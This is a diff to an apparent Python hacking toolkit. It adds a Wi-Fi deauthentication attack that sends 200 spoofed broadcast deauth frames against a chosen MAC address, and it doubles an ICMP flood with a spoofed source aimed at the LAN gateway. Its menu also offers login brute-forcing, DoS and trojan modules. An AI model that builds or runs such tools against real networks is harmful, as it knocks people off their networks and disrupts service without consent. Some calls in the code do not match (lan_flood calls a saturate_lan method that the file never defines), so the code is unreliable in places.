@@ -3,10 +3,10 @@ import requests
 from os import system
 from Core import *
 from scapy.layers.l2 import Ether, ARP, srp
-from scapy.all import send
+from scapy.all import send, sendp
 from scapy.layers.inet import IP, ICMP
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 import threading
-import socket
 import os
 
 
@@ -95,8 +95,9 @@ class Web:
 
 
 class LAN:
-    def __init__(self):
+    def __init__(self, mac: str = None):
         self.gateway = ''.join([i for i in re.findall(r'(?<=via)\s\d+\.\d+\.\d+\.\d+', os.popen('ip r').read())])
+        self.mac = mac
 
     def list_devices(self):
         target = f"{self.gateway.strip()}/24"
@@ -113,7 +114,7 @@ class LAN:
         return devices
 
     def lan_saturation(self, msg: str = "HSC advices you to go offline and play outside."):
-        for i in range(50):
+        for i in range(100):
             send(IP(src='6.6.6.6', dst=self.gateway.strip()) / ICMP() / msg)
             send(IP(src='6.6.6.6', dst=self.gateway.strip()) / ICMP() / msg)
 
@@ -132,15 +133,19 @@ class LAN:
         for i in range(thread_amount):
             threads[i].join()
 
+    @out_of_order
+    def de_auth(self):
+        broadcast = 'ff:ff:ff:ff:ff:ff'
+
+        pkt = RadioTap() / Dot11(addr1=broadcast, addr2=self.mac, addr3=self.mac) / Dot11Deauth()
+        sendp(pkt, iface='wlo1', count=200, inter=.2)
+
 
 class DoS:
     def __init__(self, target_ip: str, target_port: int, byte_size: int):
         self.target_ip = target_ip
         self.target_port = target_port
         self.full_address = (target_ip, target_port)
-
-        self.byte_size = byte_size
-        self.threads = []
 
 
 if __name__ == '__main__':
@@ -192,6 +197,15 @@ def cat_select():  # This function is the first startup function.
             elif cat == 'trojan':
                 CURRENT_MODULE = 'TROJAN_MODULE'
                 break
+
+        elif command == 'get_mem_addr':   # feature is useless, for testing only.
+            if not os.path.exists('a.out'):
+                os.system('g++ memAddr.cpp')
+                os.system('./a.out')
+            else:
+                os.system('./a.out')
+
+            os.system('rm a.out')
 
 
 cat_select()  # Calling the cat select function.
@@ -253,7 +267,7 @@ def web_module():
             login_brute(wl, known_username)  # Brutes login.
         else:
             print("URL is empty, please specify URL.")
-    
+
     @out_of_order
     def dos_input():
         if os.getuid() == 0:
@@ -307,15 +321,14 @@ def web_module():
 def network_module():
     network = None
     configured = False
-    lan = LAN()
 
     def get_gateway():
-        if lan is None:
-            print("Configure this tool first please.")
-            network_module()
+        lan = LAN()
         print(lan.gateway.strip())
 
     def fetch_all_devices():
+        lan = LAN()
+
         for device in lan.list_devices():
             print('IP\t\tMAC')
             print(device['IP'], device['MAC'])
@@ -327,11 +340,19 @@ def network_module():
             3. lan_flood (floods the lan).
             4. clear (clears screen).
             5. exit (exits program).
-            6. back (goes back to category selection). """)
+            6. back (goes back to category selection). 
+            7. deauth (Deauths a MAC address).""")
 
     def lan_flood(_msg: str, threads: int):
+        lan = LAN()
+
         for _msg in lan.saturate_lan(10):
             print(_msg)
+
+    def de_auth():
+        mac = input("network(mac_address)>> ")
+        lan = LAN(mac)
+        lan.de_auth()
 
     while True:
         cmd = input('network> ')
@@ -357,6 +378,8 @@ def network_module():
             msg = input("network(flood-msg)>> ")
             thread_amount = int(input("flood(threads)>> "))
             lan_flood(msg, thread_amount)
+        elif cmd == 'deauth':
+            de_auth()
         elif cmd == 'back':
             cat_select()
         else:
